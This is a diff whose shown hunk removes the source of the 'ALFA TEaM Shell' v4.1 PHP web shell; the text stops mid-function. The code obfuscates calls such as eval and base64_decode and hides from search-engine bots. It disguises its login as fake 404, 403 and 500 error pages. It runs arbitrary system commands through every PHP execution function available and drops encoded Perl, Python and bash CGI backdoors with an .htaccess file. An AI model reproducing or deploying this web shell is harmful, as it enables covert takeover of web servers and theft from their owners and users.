@@ -1,6495 +1,5106 @@
 <?php
-$GLOBALS['oZgNypoPRU'] = array(
-    'username' => 'alfashell.net',
-    'password' => 'md5password',
-    'safe_mode' => '0',
-    'login_page' => '404',
-    'show_icons' => '0',
-    'post_encryption' => false,
-    'cgi_api' => false,
-);
-
-$CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
-$aztJtafUXm = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
-$OVpGNqqFZs = 'e' . 'v' . 'al';
-$psDEwGhsxg = 'gz' . 'inf' . 'late';
-
-if (!$CWppUDJxuf('b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . ''))
-{
-    function vcnvSCZgBz($data)
-    {
-        if (empty($data)) return;
-        $b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-        $o1 = $o2 = $o3 = $h1 = $h2 = $h3 = $h4 = $bits = $i = 0;
-        $ac = 0;
-        $enc = '';
-        $tmp_arr = array();
-        if (!$data)
-        {
-            return $data;
-        }
-        do
-        {
-            $o1 = $aztJtafUXm($data, $i++);
-            $o2 = $aztJtafUXm($data, $i++);
-            $o3 = $aztJtafUXm($data, $i++);
-            $bits = $o1 << 16 | $o2 << 8 | $o3;
-            $h1 = $bits >> 18 & 0x3f;
-            $h2 = $bits >> 12 & 0x3f;
-            $h3 = $bits >> 6 & 0x3f;
-            $h4 = $bits & 0x3f;
-            $tmp_arr[$ac++] = charAt($b64, $h1) . charAt($b64, $h2) . charAt($b64, $h3) . charAt($b64, $h4);
-        }
-        while ($i < strlen($data));
-        $enc = implode($tmp_arr, '');
-        $r = (strlen($data) % 3);
-        return ($r ? substr($enc, 0, ($r - 3)) : $enc) . substr('===', ($r || 3));
-    }
-    function charCodeAt($data, $char)
-    {
-        return ord(substr($data, $char, 1));
-    }
-    function charAt($data, $char)
-    {
-        return substr($data, $char, 1);
-    }
-}
-else
-{
-    function vcnvSCZgBz($s)
-    {
-        $b = 'b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . '';
-        return $b($s);
-    }
-}
-if (!$CWppUDJxuf('b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . ''))
-{
-    function zRtSHsbTzV($input)
-    {
-        if (empty($input)) return;
-        $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
-        $chr1 = $chr2 = $chr3 = "";
-        $enc1 = $enc2 = $enc3 = $enc4 = "";
-        $i = 0;
-        $output = "";
-        $input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
-        do
-        {
-            $enc1 = strpos($keyStr, substr($input, $i++, 1));
-            $enc2 = strpos($keyStr, substr($input, $i++, 1));
-            $enc3 = strpos($keyStr, substr($input, $i++, 1));
-            $enc4 = strpos($keyStr, substr($input, $i++, 1));
-            $chr1 = ($enc1 << 2) | ($enc2 >> 4);
-            $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
-            $chr3 = (($enc3 & 3) << 6) | $enc4;
-            $output = $output . chr((int)$chr1);
-            if ($enc3 != 64)
-            {
-                $output = $output . chr((int)$chr2);
-            }
-            if ($enc4 != 64)
-            {
-                $output = $output . chr((int)$chr3);
-            }
-            $chr1 = $chr2 = $chr3 = "";
-            $enc1 = $enc2 = $enc3 = $enc4 = "";
-        }
-        while ($i < strlen($input));
-        return $output;
-    }
-}
-else
-{
-    function zRtSHsbTzV($s)
-    {
-        $b = 'b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . '';
-        return $b($s);
-    }
-}
-
-function __ZW5jb2Rlcg($s)
-{
-    return vcnvSCZgBz($s);
-}
-function __ZGVjb2Rlcg($s)
-{
-    return zRtSHsbTzV($s);
-}
-
-$GLOBALS['DB_NAME'] = $GLOBALS['oZgNypoPRU'];
-
-foreach ($GLOBALS['DB_NAME'] as $key => $value)
-{
-	$prefix = substr($key, 0, 2);
-	if ($prefix == "us")
-	{
-		$GLOBALS['DB_NAME']["user"] = $value;
-		$GLOBALS['DB_NAME']["user_rand"] = $key;
-	}
-	elseif ($prefix == "pa")
-	{
-		$GLOBALS['DB_NAME']["pass"] = $value;
-		$GLOBALS['DB_NAME']["pass_rand"] = $key;
-	}
-	elseif ($prefix == "sa")
-	{
-		$GLOBALS['DB_NAME']["safemode"] = $value;
-		$GLOBALS['DB_NAME']["safemode_rand"] = $key;
-	}
-	elseif ($prefix == "lo")
-	{
-		$GLOBALS['DB_NAME']["login_page"] = $value;
-		$GLOBALS['DB_NAME']["login_page_rand"] = $key;
-	}
-	elseif ($prefix == "sh")
-	{
-		$GLOBALS['DB_NAME']["show_icons"] = $value;
-		$GLOBALS['DB_NAME']["show_icons_rand"] = $key;
-	}
-	elseif ($prefix == "po")
-	{
-		$GLOBALS['DB_NAME']["post_encryption"] = $value;
-		$GLOBALS['DB_NAME']["post_encryption_rand"] = $key;
-	}
-	elseif ($prefix == "cg")
-	{
-		$GLOBALS['DB_NAME']["cgi_api"] = $value;
-		$GLOBALS['DB_NAME']["cgi_api_rand"] = $key;
-	}
-}
-	
-unset($GLOBALS['oZgNypoPRU']);
-
-if (!isset($_SERVER["HTTP_HOST"])) exit();
-
-
-if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler","bot","spider");if(preg_match('/'.implode('|',$userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
-if(!isset($GLOBALS['DB_NAME']['user']))exit('$GLOBALS[\'DB_NAME\'][\'user\']');
-if(!isset($GLOBALS['DB_NAME']['pass']))exit('$GLOBALS[\'DB_NAME\'][\'pass\']');
-if(!isset($GLOBALS['DB_NAME']['safemode']))exit('$GLOBALS[\'DB_NAME\'][\'safemode\']');
-if(!isset($GLOBALS['DB_NAME']['login_page']))exit('$GLOBALS[\'DB_NAME\'][\'login_page\']');
-if(!isset($GLOBALS['DB_NAME']['show_icons']))exit('$GLOBALS[\'DB_NAME\'][\'show_icons\']');
-if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'post_encryption\']');
-define("__ALFA_VERSION__", "4.1");
-define("__ALFA_UPDATE__", "2");
-define("__ALFA_CODE_NAME__", "Tesla");
-define("__ALFA_DATA_FOLDER__", "ALFA_DATA");
-define("__ALFA_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
-define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__?_AlfaSecretKey():'');
-$GLOBALS['__ALFA_COLOR__'] = array(
-		"shell_border" => array(
-			"key_color" => "#0E304A",
-			"multi_selector" => array(
-				".header" => "border: 7px solid {color}",
-				"#meunlist" => "border-color: {color}",
-				"#hidden_sh" => "background-color: {color}",
-				".ajaxarea" => "border: 1px solid {color}",
-				".foot" => "border-color: {color}",
-			)
-		),
-		"header_vars" => "#27979B",
-		"header_values" => "#67ABDF",
-		"header_on" => "#00FF00",
-		"header_off" => "#ff0000",
-		"header_none" => "#00FF00",
-		"home_shell" => "#ff0000",
-		"home_shell:hover" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".home_shell:hover" => "color: {color};",
-			)
-		),
-		"back_shell" => "#efbe73",
-		"back_shell:hover" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".back_shell:hover" => "color: {color};",
-			)
-		),
-		"header_pwd" => "#00FF00",
-		"header_pwd:hover" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".header_pwd:hover" => "color: {color};",
-			)
-		),
-		"header_drive" => "#00FF00",
-		"header_drive:hover" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".header_drive:hover" => "color: {color};",
-			)
-		),
-		"header_show_all" => "#00FF00",
-		"disable_functions" => "#ff0000",
-		"footer_text" => "#27979B",
-		"menu_options" => "#27979B",
-		"menu_options:hover" => array(
-			"key_color" => "#646464",
-			"multi_selector" => array(
-				".menu_options:hover" => "background-color: {color};font-weight: unset;",
-			)
-		),
-		"options_list" => array(
-			"key_color" => "#00FF00",
-			"multi_selector" => array(
-				".content_options_holder .header center a" => "color: {color};",
-			)
-		),
-		"options_list:hover" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".content_options_holder .header center a:hover" => "color: {color};",
-			)
-		),
-		"options_list_header" => array(
-			"key_color" => "#59cc33",
-			"multi_selector" => array(
-				".txtfont_header" => "color: {color};",
-			)
-		),
-		"options_list_text" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".txtfont,.tbltxt" => "color: {color};",
-			)
-		),
-		"Alfa+" => array(
-			"key_color" => "#06ff0f",
-			"multi_selector" => array(
-				".alfa_plus" => "color: {color};font-weight: unset;",
-			)
-		),
-		"hidden_shell_text" => array(
-			"key_color" => "#00FF00",
-			"multi_selector" => array(
-				"#hidden_sh a" => "color: {color};",
-			)
-		),
-		"hidden_shell_version" => "#ff0000",
-		"shell_name" => "#FF0000",
-		"main_row:hover" => array(
-			"key_color" => "#646464","multi_selector" => array(
-				".main tr:hover" => "background-color: {color};",
-			)
-		),
-		"main_header" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".main th" => "color: {color};",
-			)
-		),
-		"main_name" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".main .main_name" => "color: {color};font-weight: unset;",
-			)
-		),
-		"main_size" => "#67ABDF",
-		"main_modify" => "#67ABDF",
-		"main_owner_group" => "#67ABDF",
-		"main_green_perm" => "#25ff00",
-		"main_red_perm" => "#FF0000",
-		"main_white_perm" => "#FFFFFF",
-		"beetween_perms" => "#FFFFFF",
-		"main_actions" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".main .actions" => "color: {color};",
-			)
-		),
-		"menu_options:hover" => array(
-			"key_color" => "#646464",
-			"multi_selector" => array(
-				".menu_options:hover" => "background-color: {color};font-weight: unset;",
-			)
-		),
-		"minimize_editor_background" => array(
-			"key_color" => "#0e304a",
-			"multi_selector" => array(
-				".minimized-wrapper" => "background-color: {color};",
-			)
-		),
-		"minimize_editor_text" => array(
-			"key_color" => "#f5deb3",
-			"multi_selector" => array(
-				".minimized-text" => "color: {color};",
-			)
-		),
-		"editor_border" => array(
-			"key_color" => "#0e304a",
-			"multi_selector" => array(
-				".editor-explorer,.editor-modal" => "border: 2px solid {color};",
-			)
-		),
-		"editor_background" => array(
-			"key_color" => "rgba(0, 1, 23, 0.94)",
-			"multi_selector" => array(
-				".editor-explorer,.editor-modal" => "background-color: {color};",
-			)
-		),
-		"editor_header_background" => array(
-			"key_color" => "rgba(21, 66, 88, 0.93)",
-			"multi_selector" => array(
-				".editor-header" => "background-color: {color};",
-			)
-		),
-		"editor_header_text" => array(
-			"key_color" => "#00ff7f",
-			"multi_selector" => array(
-				".editor-path" => "color: {color};",
-			)
-		),
-		"editor_header_button" => array(
-			"key_color" => "#1d5673",
-			"multi_selector" => array(
-				".close-button, .editor-minimize" => "background-color: {color};",
-			)
-		),
-		"editor_actions" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".editor_actions" => "color: {color};",
-			)
-		),
-		"editor_file_info_vars" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".editor_file_info_vars" => "color: {color};",
-			)
-		),
-		"editor_file_info_values" => array(
-			"key_color" => "#67ABDF",
-			"multi_selector" => array(
-				".filestools" => "color: {color};",
-			)
-		),
-		"editor_history_header" => array(
-			"key_color" => "#14ff07",
-			"multi_selector" => array(
-				".hheader-text,.history-clear" => "color: {color};",
-			)
-		),
-		"editor_history_list" => array(
-			"key_color" => "#03b3a3",
-			"multi_selector" => array(
-				".editor-file-name" => "color: {color};",
-			)
-		),
-		"editor_history_selected_file" => array(
-			"key_color" => "rgba(49, 55, 93, 0.77)",
-			"multi_selector" => array(
-				".is_active" => "background-color: {color};",
-			)
-		),
-		"editor_history_file:hover" => array(
-			"key_color" => "#646464",
-			"multi_selector" => array(
-				".file-holder > .history:hover" => "background-color: {color};",
-			)
-		),
-		"input_box_border" => array(
-			"key_color" => "#0E304A",
-			"multi_selector" => array(
-				"input[type=text],textarea" => "border: 1px solid {color}",
-			)
-		),
-		"input_box_text" => array(
-			"key_color" => "#999999",
-			"multi_selector" => array(
-				"input[type=text],textarea" => "color: {color};",
-			)
-		),
-		"input_box:hover" => array(
-			"key_color" => "#27979B",
-			"multi_selector" => array(
-				"input[type=text]:hover,textarea:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
-			)
-		),
-		"select_box_border" => array(
-			"key_color" => "#0E304A",
-			"multi_selector" => array(
-				"select" => "border: 1px solid {color}",
-			)
-		),
-		"select_box_text" => array(
-			"key_color" => "#FFFFEE",
-			"multi_selector" => array(
-				"select" => "color: {color};",
-			)
-		),
-		"select_box:hover" => array(
-			"key_color" => "#27979B",
-			"multi_selector" => array(
-				"select:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
-			)
-		),
-		"button_border" => array(
-			"key_color" => "#27979B",
-			"multi_selector" => array(
-				"input[type=submit],.button,#addup" => "border: 1px solid {color};",
-			)
-		),
-		"button:hover" => array(
-			"key_color" => "#27979B",
-			"multi_selector" => array(
-				"input[type=submit]:hover" => "box-shadow:0 0 4px {color};border:2px solid {color};",
-				".button:hover,#addup:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
-			)
-		),
-		"outputs_text" => array(
-			"key_color" => "#67ABDF",
-			"multi_selector" => array(
-				".ml1" => "color: {color};",
-			)
-		),
-		"outputs_border" => array(
-			"key_color" => "#0E304A",
-			"multi_selector" => array(
-				".ml1" => "border: 1px solid {color};",
-			)
-		),
-		"uploader_border" => array(
-			"key_color" => "#0E304A",
-			"multi_selector" => array(
-				".inputfile" => "box-shadow:0 0 4px {color};border:1px solid {color};",
-			)
-		),
-		"uploader_background" => array(
-			"key_color" => "#0E304A",
-			"multi_selector" => array(
-				".inputfile strong" => "background-color: {color};",
-			)
-		),
-		"uploader_text_right" => array(
-			"key_color" => "#FFFFFF",
-			"multi_selector" => array(
-				".inputfile strong" => "color: {color};",
-			)
-		),
-		"uploader_text_left" => array(
-			"key_color" => "#25ff00",
-			"multi_selector" => array(
-				".inputfile span" => "color: {color};",
-			)
-		),
-		"uploader:hover" => array(
-			"key_color" => "#27979B",
-			"multi_selector" => array(
-				".inputfile:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
-			)
-		),
-		"uploader_progress_bar" => array(
-			"key_color" => "#00ff00",
-			"multi_selector" => array(
-				".up_bar" => "background-color: {color};",
-			)
-		),
-		"mysql_tables" => "#00FF00",
-		"mysql_table_count" => "#67ABDF",
-		"copyright" => "#dfff00",
-		"scrollbar" => array(
-			"key_color" => "#1e82b5",
-			"multi_selector" => array(
-				"*::-webkit-scrollbar-thumb" => "background-color: {color};",
-			)
-		),
-		"scrollbar_background" => array(
-			"key_color" => "#000115",
-			"multi_selector" => array(
-				"*::-webkit-scrollbar-track" => "background-color: {color};",
-			)
-		),
-);
-$GLOBALS['__file_path'] = str_replace('\\','/',trim(preg_replace('!\(\d+\)\s.*!', '', __FILE__)));
-$config = array('AlfaUser' => $GLOBALS['DB_NAME']['user'],'AlfaPass' => $GLOBALS['DB_NAME']['pass'],'AlfaProtectShell' => $GLOBALS['DB_NAME']['safemode'],'AlfaLoginPage' => $GLOBALS['DB_NAME']['login_page']);
-//@session_start();
-@session_write_close();
-@ignore_user_abort(true);
-@set_time_limit(0);
-@ini_set('memory_limit', '-1');
-@ini_set("upload_max_filesize", "9999m");
-if($config['AlfaProtectShell']){
-$SERVER_SIG = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");
-$Eform='<form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form>';
-if($config['AlfaLoginPage'] == 'gui'){
-if(@$_COOKIE["AlfaUser"] != $config['AlfaUser'] && $_COOKIE["AlfaPass"] != md5($config['AlfaPass'])){
-if(@$_POST["usrname"]==$config['AlfaUser'] && @md5($_POST["password"])==$config['AlfaPass']){
-__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
-__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
-@header('location: '.$_SERVER["PHP_SELF"]);
-}
-echo '
-<style>
-body{background: black;}
-#loginbox { font-size:11px; color:green; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
-#loginbox td { border-radius:5px; font-size:11px; }
-</style>
-<title>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
-<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="http://solev	isible.com/images/alfa-iran.png" /></center>
-<div id=loginbox><p><font face="verdana,arial" size=-1>
-<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
-<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
-<tr><td bgcolor="black" style="padding:5">
-<form method="post">
-<input type="hidden" name="action" value="login">
-<input type="hidden" name="hide" value="">
-<center><table>
-<tr><td><font color="green" face="verdana,arial" size=-1>Login:</font></td><td><input type="text" size="30" name="usrname" placeholder="username" onfocus="if (this.value == \'username\'){this.value = \'\';}"></td></tr>
-<tr><td><font color="green" face="verdana,arial" size=-1>Password:</font></td><td><input type="password" size="30" name="password" placeholder="password" onfocus="if (this.value == \'password\') this.value = \'\';"></td></tr>
-<tr><td><font face="verdana,arial" size=-1>&nbsp;</font></td><td><font face="verdana,arial" size=-1><input type="submit" value="Login"></font></td></tr></table>
-</div><br /></center>';
-exit;
-}
-}elseif($config['AlfaLoginPage']=='500'){
-if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
-if(@md5($_POST["password"])==$config['AlfaPass']){
-__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
-__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
-@header('location: '.$_SERVER["PHP_SELF"]);
-}
-echo '<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p><p>Please contact the server administrator, '.$_SERVER['SERVER_ADMIN'].' and inform them of the time the error occurred, and anything you might have done that may have caused the error.</p><p>More information about this error may be available in the server error log.</p><hr>'.$SERVER_SIG.'</body></html>'.$Eform;
-exit;
-}
-}elseif($config['AlfaLoginPage']=='403'){
-if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
-if(@md5($_POST["password"])==$config['AlfaPass']){
-__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
-__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
-@header('location: '.$_SERVER["PHP_SELF"]);
-}
-echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
-exit;
-}
-}elseif($config['AlfaLoginPage']=='404'){
-if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
-if(@md5($_POST["password"])==$config['AlfaPass']){
-__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
-__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
-@header('location: '.$_SERVER["PHP_SELF"]);
-}
-echo "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
-exit;
-}
-}
-}
-function decrypt_post($str){
-	if(__ALFA_POST_ENCRYPTION__){
-		$pwd = __ALFA_SECRET_KEY__;
-		$pwd     = __ZW5jb2Rlcg($pwd);
-		$str     = __ZGVjb2Rlcg($str);
-		$enc_chr = "";
-		$enc_str = "";
-		$i       = 0;
-		while ($i < strlen($str)) {
-			for ($j = 0; $j < strlen($pwd); $j++) {
-				$enc_chr = chr(ord($str[$i]) ^ ord($pwd[$j]));
-				$enc_str .= $enc_chr;
-				$i++;
-				if ($i >= strlen($str))
-					break;
-			}
-		}
-		return __ZGVjb2Rlcg($enc_str);
-	}else{
-		return __ZGVjb2Rlcg($str);
-	}
-}
-
-function _AlfaSecretKey(){
-	$secret = @$_COOKIE["AlfaSecretKey"];
-	if(!isset($_COOKIE["AlfaSecretKey"])){
-		$secret = uniqid(mt_rand(), true);
-		__alfa_set_cookie("AlfaSecretKey", $secret);
-	}
-	return $secret;
-}
-function alfa_getColor($target){
-	if(isset($GLOBALS["DB_NAME"]["color"][$target])&&$GLOBALS["DB_NAME"]["color"][$target]!=""){
-		return $GLOBALS["DB_NAME"]["color"][$target];
-	}else{
-		$target = $GLOBALS["__ALFA_COLOR__"][$target];
-		if(is_array($target)){
-			return $target["key_color"];
-		}else{
-			return $target;
-		}
-	}
-}
-function alfaCssLoadColors(){
-	$css = "";
-	foreach($GLOBALS['__ALFA_COLOR__'] as $key => $value){
-		if(!is_array($value)){
-			$value = alfa_getColor($key);
-			$css .= ".{$key}{color: {$value};}";
-		}else{
-			if(isset($value["multi_selector"])){
-				foreach($value["multi_selector"] as $k => $v){
-					$color = alfa_getColor($key);
-					$code = str_replace("{color}", $color, $v);
-					$css .=  $k."{".$code."}";
-				}
-			}
-		}
-	}
-	return $css;
-}
-if(isset($_POST['ajax'])){
-function AlfaNum(){
-$args = func_get_args();
-$alfax = array();
-$find = array();
-for($i=1;$i<=10;$i++){
-$alfax[] = $i;
-}
-foreach($args as $arg){
-$find[] = $arg;
-}
-echo '<script>';
-foreach($alfax as $alfa){
-if(in_array($alfa,$find))
-continue;
-echo 'alfa'.$alfa."_=";
-}
-echo '""</script>';
-}}
-function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
-	if(!$GLOBALS["DB_NAME"]["cgi_api"]){
-		return "";
-	}
-	if(isset($_COOKIE["alfacgiapi_mode"])){
-		return "";
-	}
-	$cmd_pure = $cmd;
-	$is_curl = function_exists('curl_version');
-	$is_socket = function_exists('fsockopen');
-	if($is_curl||$is_socket){
-		$recreate = false;
-		if(isset($_COOKIE["alfacgiapi"])){
-			if(!@file_exists("alfacgiapi/".$_COOKIE["alfacgiapi"].".alfa")){
-				$recreate = true;
-				$lang = $_COOKIE["alfacgiapi"];
-			}
-		}
-		if(!isset($_COOKIE["alfacgiapi"])||$recreate){
-			@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
-			$perl = 'jZFRT8IwFIXf/RXXOqWNsKoxPlAwRliERIbK9EUMGdsFGrYyt2Iky/ztdkMlJj74cpKee853k96Dfb7OUj6ViieYRgDQ6FdOtAr8iE99FcZS7a0zhEF/4DSb136GF+ciSaXSQDorpVHpht4k2ASN75ovdByN1VgRIWfUctynvPbg3D86I28ycLzesFsrAF+B3A1HHmF5vAFqyTpYS9wYffMjo1IxkaIf0pHX7buVYaRidYau57je5NZxb7xerWDiSipoQ5ZEUlN+xL/qs5UBBAvzAHoCtg3WgbFzM3u25Au0PyDj42MOfC7objfbkdpbUpmuwxkTZWhbO6S2zXjiB0tKAlKHBb5T65QxPkdRQv6RkioveQXYbSDjEwJyBjTEmVQY0p8pY7+TJVwU5bcalwRxSAqWby8RYrAKcTKtrvM1X2CwNAmbtJIUL4nINpnGmP4VrVDs+6otXhWK4hM=';
-			$py = "bZDBS8MwGMXPy19R66EtzhRk7DA3L1rxItOt3gajTb6twTQJydexIf7vJqvMiR5CyHvv93jk8iLvnM1roXJzwEYrgvYwIQPRGm0xYluB9W1/UVBVLSHNCOwZGPQpUzlHvqPaDX1sWFcOxiOy0baNZgGkjwIkX6K21RZSUDthtZp9JIvi9a1YluvnonyaPyST5GW+LJPPjLCWezIU0C3grpIdpIkXE281wN7/MYPsbWOFwii+1wpB4TUeDEwQ9pg32MqVXalwYiI2ka8L84/5fjGtxyMOTHNIj3XZVTw1Fu5iMmCNkHztkAs1jE4P3aFfoh012oC6Sf/WtDzLftGUSe3CBw4suE4G/ryOWqh4eo4E8cT0a3uSOrTC/KjxND+O/QI=";
-			$bash = "rVRdj5pAFH2uv+I6DGa1Iaybpg9amrRboptYbV360JQGWRiFyPI5WreU/95hoCyjsfFh52nm3nM/zuTcK3XVBz9UH+zM6xDHi0AhgG6jkJKQKvQpJiOg5EBVjz4GZmiGqLPehQ71oxCcjW9tCLW+LO4Na2+n2VU/7wA7PwDhpf71m87sn3VjuviEoKsBKoEIfkKvBymhuzSs0V1QfrMQFrD8bt0by7v5xDqH5cjbxdzQ54Y10+cTYyrCXqXEdkGZwxEKTtLzjHVUIdJyiRO5hHF6poQlUEICw5OegsixA9gDBY+/qYZwPlTV1yoUsoy47ZfnB6RMkku0AGVD4RoUmzHJaVH9jcxYjMGNOLw8+zLNvmAIWTblQYEaDy9ApYHcsvnrC7JTj4RNRHk8jUFG16ObQjBXBZgVCea6I7T6pxOTnQPOvWLV4NY+v7pRSPiFQ6uw/3w3U5Gon/KzAwo3Zz47gRi27MszbnPsjAAegv9MbqIbfaH3RmR5WwZFLZ1EO3b0ROrjcfMslSPmPpmDCypz8Nnylfd8Dx8XxvRF+b0MhaS4nAbJbIdfMs9f0+qmIcADECemrpwcj0fMC8pyrz0Z29IYy7LWNnLZxtJAa9mqdiUcC+Hl3hoiYPPyYTZDoHDlZirgLaj1IOGsJmwKpMghjlLK3FukoZWwQcBEeG+iFRIHoxmElv65toDV7iQ7kj5p+IqPD3YeXfgDbEWTt29AUarU/WpdNxiPONuzqHKpv4tT8t50UId1FbBdwWsULb9aA/4C";
-			if($lang=="perl")$source = $perl;elseif($lang=="py")$source = $py;else $source = $bash;
-			alfaWriteTocgiapi($lang.".alfa",$source);
-			alfacgihtaccess('cgi', "alfacgiapi/");
-		}else{
-			$lang = $_COOKIE["alfacgiapi"];
-		}
-		$cmd = "check=W3NvbGV2aXNpYmxlfmFwaV0=&cmd=".__ZW5jb2Rlcg("cd ".$GLOBALS['cwd'].";".$cmd);
-		if($is_curl){
-			$address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/alfacgiapi/".$lang.".alfa";
-			$post = new AlfaCURL();
-			$data = $post->Send($address, "post", $cmd);
-		}elseif($is_socket){
-			$server = $_SERVER["SERVER_NAME"];
-			$uri = dirname($_SERVER["REQUEST_URI"])."/alfacgiapi/".$lang.".alfa";
-			$data = _alfa_fsockopen($server,$uri,$cmd);
-		}
-		$out = "";
-		if(strstr($data, "[solevisible~api]")){
-			if($set_cookie){
-				__alfa_set_cookie("alfacgiapi", $lang);
-			}
-			if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)){
-				$out = $res[1];
-			}
-		}elseif($lang=="perl"){
-			return _alfa_cgicmd($cmd_pure,"py",$set_cookie);
-		}elseif($lang=="py"){
-			return _alfa_cgicmd($cmd_pure,"bash",$set_cookie);
-		}else{
-			if($set_cookie){
-				__alfa_set_cookie("alfacgiapi_mode", "off");
-			}
-		}
-		return trim($out);
-	}else{
-		return "";
-	}
-}
-function alfaGetCwd(){
-	if(function_exists("getcwd")){
-		return @getcwd();
-	}else{
-		return dirname($_SERVER["SCRIPT_FILENAME"]);
-	}
-}
-function alfaEx($in,$re=false,$cgi=true,$all=false){
-	$data = _alfa_php_cmd($in,$re);
-	if(empty($data)&&$cgi||$all){
-		if($GLOBALS['sys']=='unix'){
-			if(strlen(_alfa_php_cmd("whoami"))==0||$all){
-				$cmd = _alfa_cgicmd($in);
-				if(!empty($cmd)){
-					return $cmd;
-				}
-			}
-		}
-	}
-	return $data;
-}
-function _alfa_php_cmd($in,$re=false){
-$out='';
-try{
-if($re)$in=$in." 2>&1";
-if(function_exists('exec')){
-@exec($in,$out);
-$out = @join("\n",$out);
-}elseif(function_exists('passthru')) {
-ob_start();
-@passthru($in);
-$out = ob_get_clean();
-}elseif(function_exists('system')){
-ob_start();
-@system($in);
-$out = ob_get_clean();
-} elseif (function_exists('shell_exec')) {
-$out = shell_exec($in);
-}elseif(function_exists("popen")&&function_exists("pclose")){
-if(is_resource($f = @popen($in,"r"))){
-$out = "";
-while(!@feof($f))
-$out .= fread($f,1024);
-pclose($f);
-}
-}elseif(function_exists('proc_open')){
-$pipes = array();
-$process = @proc_open($in.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $pipes, null);
-$out=@stream_get_contents($pipes[1]);
-}elseif(class_exists('COM')){
-$alfaWs = new COM('WScript.shell');
-$exec = $alfaWs->exec('cmd.exe /c '.$_POST['alfa1']);
-$stdout = $exec->StdOut();
-$out=$stdout->ReadAll();
-}
-}catch(Exception $e){}
-return $out;
-}
-function _alfa_fsockopen($server,$uri,$post){
-	$socket = @fsockopen($server, 80, $errno, $errstr, 15);
-	if($socket){
-		$http  = "POST {$uri} HTTP/1.0\r\n";
-		$http .= "Host: {$server}\r\n";
-		$http .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
-		$http .= "Content-Type: application/x-www-form-urlencoded\r\n";
-		$http .= "Content-length: " . strlen($post) . "\r\n";
-		$http .= "Connection: close\r\n\r\n";
